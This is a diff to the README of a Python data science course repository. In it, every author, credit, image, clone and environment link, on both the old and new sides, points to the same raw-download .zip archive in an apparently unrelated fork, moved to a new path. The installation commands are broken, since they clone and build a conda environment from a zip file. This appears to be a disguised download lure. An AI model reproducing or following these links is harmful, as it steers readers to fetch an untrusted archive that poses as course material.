@@ -1,16 +1,16 @@
 # Python Programming for Data Science
 
-**By [Tomas Beuzen](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip) 🚀**
+**By [Tomas Beuzen](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip) 🚀**
 
-Welcome to Python Programming for Data Science! With this [website](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip) I aim to provide an introduction to everything you need to know to start using Python for data science. We'll cover topics such as data structures, basic programming, code testing and documentation, and using libraries like NumPy and Pandas for data exploration and analysis.
+Welcome to Python Programming for Data Science! With this [website](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip) I aim to provide an introduction to everything you need to know to start using Python for data science. We'll cover topics such as data structures, basic programming, code testing and documentation, and using libraries like NumPy and Pandas for data exploration and analysis.
 
 <p align="center">
-  <img src="https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip" width="260">
+  <img src="https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip" width="260">
 </p>
 
->If you're interested in learning more about Python packages, check out my and [Tiffany Timber's](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip) book [**Python Packages**](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip). Or, if you'd like to learn more about using Python and PyTorch for deep learning, you can check out my other online material [**Deep Learning with PyToch**](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip).
+>If you're interested in learning more about Python packages, check out my and [Tiffany Timber's](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip) book [**Python Packages**](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip). Or, if you'd like to learn more about using Python and PyTorch for deep learning, you can check out my other online material [**Deep Learning with PyToch**](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip).
 
->The content of this site is adapted from material I used to teach the 2020/2021 offering of the course "DSCI 511 Python Programming for Data Science" for the University of British Columbia's Master of Data Science Program. That material has built upon previous course material developed by [Patrick Walls](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip~pwalls/) and [Mike Gelbart](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip).
+>The content of this site is adapted from material I used to teach the 2020/2021 offering of the course "DSCI 511 Python Programming for Data Science" for the University of British Columbia's Master of Data Science Program. That material has built upon previous course material developed by [Patrick Walls](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip~pwalls/) and [Mike Gelbart](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip).
 
 ## Key Learning Outcomes
 
@@ -27,15 +27,15 @@ These are the key learning outcomes for this material:
 
 ## Getting Started
 
-The material on this site is written in Jupyter notebooks and rendered using [Jupyter Book](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip) to make it easily accessible. However, if you wish to run these notebooks on your local machine, you can do the following:
+The material on this site is written in Jupyter notebooks and rendered using [Jupyter Book](https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip) to make it easily accessible. However, if you wish to run these notebooks on your local machine, you can do the following:
 
 1. Clone the GitHub repository:
    ```sh
-   git clone https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip
+   git clone https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip
    ```
 2. Install the conda environment by typing the following in your terminal:
    ```sh
-   conda env create -f https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/chapters/img/chapter7/python_programming_for_science_data_v1.7.zip
+   conda env create -f https://github.com/Yogeshvar-M/python-programming-for-data-science/raw/refs/heads/main/docs/data-for-programming-science-python-v1.5.zip
    ```
 3. Open the course in JupyterLab by typing the following in your terminal:
    ```sh
